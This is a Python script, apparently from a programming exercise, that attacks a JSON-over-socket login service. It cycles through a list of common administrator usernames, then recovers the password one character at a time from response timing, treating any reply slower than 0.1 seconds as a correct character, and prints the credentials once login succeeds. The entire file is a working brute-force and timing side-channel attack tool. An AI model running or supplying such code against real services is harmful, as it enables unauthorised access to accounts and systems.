import json
import socket
import string
import time
from sys import argv


def package(lgn, psw=''):
    return json.dumps({'login': lgn, 'password': psw}).encode()


SYMBOLS = string.digits + string.ascii_letters
LOGINS = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user',
          'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser',
          'adminadmin', 'useruser', 'superadmin', 'username', 'username1']

password = ''

with socket.socket() as client:
    client.connect((argv[1], int(argv[2])))

    for login in LOGINS:
        client.send(package(login))
        response = json.loads(client.recv(1024).decode())['result']

        while response != "Wrong login!":
            for s in SYMBOLS:
                start_time = time.perf_counter()
                client.send(package(login, password + s))
                response = json.loads(client.recv(1024).decode())['result']
                end_time = time.perf_counter()
                ping = end_time - start_time
                if ping > 0.1:
                    password += s
                    break
                elif response == "Connection success!":
                    print(package(login, password + s).decode())
                    exit()
